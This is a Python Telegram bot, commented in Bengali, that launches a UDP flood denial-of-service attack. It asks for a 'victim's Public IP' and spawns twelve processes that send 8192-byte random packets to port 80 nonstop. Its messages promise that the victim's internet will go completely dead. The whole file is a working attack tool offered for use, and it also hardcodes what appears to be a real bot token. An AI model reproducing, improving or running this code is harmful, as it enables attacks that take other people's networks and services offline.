import os
import socket
import multiprocessing
import random
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from colorama import Fore, Style, init

# কালার ইনিশিয়ালাইজ
init()

# --- কনফিগারেশন ---
TOKEN = "8620529154:AAHcN6529pcI8F6i417poylsymr0yLFkEhQ"
manager = multiprocessing.Manager()
shared_data = manager.dict()
shared_data['attacking'] = False
shared_data['packets_sent'] = 0

# ১০০% নেট বন্ধ করার এক্সট্রিম ইঞ্জিন
def supernova_flood(ip, port, shared_dict):
    # সকেট সেটআপ (Fastest Performance)
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # বিশাল সাইজের প্যাকেট (৬৫,০০০ বাইট পর্যন্ত হতে পারে, আমরা ৮১৯২ ব্যবহার করছি যাতে ড্রপ না হয়)
    payload = random._urandom(8192) 
    
    while shared_dict['attacking']:
        try:
            # সরাসরি সেন্ড (কোনো বাধা ছাড়া)
            client.sendto(payload, (ip, port))
            shared_dict['packets_sent'] += 1
        except:
            # যদি সকেট ফুল হয়ে যায়, ১ মাইক্রোসেকেন্ড বিরতি
            pass
    client.close()

# ১. স্টার্ট কমান্ড
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("🚀 START SUPERNOVA ATTACK")],
        [KeyboardButton("📊 LIVE STATUS"), KeyboardButton("🛑 STOP ATTACK")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    welcome_text = (
        "🔥 *MR DEVELOPER - SUPERNOVA V3* 🔥\n\n"
        "এটি রেলওয়ে সার্ভারের সর্বোচ্চ ক্ষমতা ব্যবহার করে ১০০% নেট জ্যাম করবে।\n"
        "⚠️ *সতর্কতা:* শুধুমাত্র ভিকটিমের **Public IP** ব্যবহার করুন।"
    )
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

# ২. মেইন হ্যান্ডলার
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text

    if user_text == "🚀 START SUPERNOVA ATTACK":
        await update.message.reply_text("🎯 *ভিকটিমের Public IP Address দিন:*", parse_mode='Markdown')
        context.user_data['waiting_for_ip'] = True
        return

    if user_text == "📊 LIVE STATUS":
        if shared_data['attacking']:
            await update.message.reply_text(f"📡 *LIVE STATUS:*\n\n📍 Target: `{shared_data['target']}`\n📤 Packets: `{shared_data['packets_sent']}`\n🔥 Power: Supernova (100%)", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ কোনো অ্যাটাক বর্তমানে রানিং নেই।")
        return

    if user_text == "🛑 STOP ATTACK":
        shared_data['attacking'] = False
        await update.message.reply_text("✅ *অ্যাটাক সফলভাবে বন্ধ করা হয়েছে।*", parse_mode='Markdown')
        return

    # আইপি পাওয়ার পর এক্সট্রিম অ্যাটাক শুরু
    if context.user_data.get('waiting_for_ip'):
        target_ip = user_text.strip()
        context.user_data['waiting_for_ip'] = False
        
        shared_data['attacking'] = True
        shared_data['target'] = target_ip
        shared_data['packets_sent'] = 0
        
        await update.message.reply_text(
            f"⚔️ *SUPERNOVA ATTACK INITIALIZED!*\n\n"
            f"📍 *Target IP:* `{target_ip}`\n"
            f"🚀 *Power:* Extreme (Multi-Process)\n"
            f"📡 *Result:* ভিকটিমের ইন্টারনেট এখন পুরোপুরি ডেড (Dead) হয়ে যাবে।",
            parse_mode='Markdown'
        )

        # রেলওয়ে সার্ভারের সিপিইউ কোর অনুযায়ী প্রসেস চালু করা (৮টি প্রসেস সবচেয়ে শক্তিশালী)
        for _ in range(12):
            p = multiprocessing.Process(target=supernova_flood, args=(target_ip, 80, shared_data))
            p.daemon = True
            p.start()

def main():
    print(Fore.RED + "MR DEVELOPER EXTREME SYSTEM STARTING..." + Style.RESET_ALL)
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()

if __name__ == "__main__":
    main()
    
